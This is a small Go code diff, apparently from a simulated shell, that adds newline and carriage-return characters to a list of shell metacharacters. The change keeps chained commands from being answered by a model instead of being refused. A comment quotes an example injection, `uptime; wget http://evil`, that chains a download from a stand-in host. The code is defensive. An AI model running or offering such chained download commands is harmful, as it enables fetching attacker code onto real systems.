@@ -45,7 +45,7 @@ var egressCapableCommands = map[string]struct{}{
 // the line is one simple command -- otherwise `uptime; wget http://evil`
 // would have its wget stage silently answered by a model instead of by the
 // interpreter that knows to refuse it.
-const shellMetacharacters = ";&|<>$`()"
+const shellMetacharacters = ";&|<>$`()\n\r"
 
 // ShouldAttemptCompletion reports whether line is a single simple command
 // that the interpreter has no builtin for and that is safe to answer with a
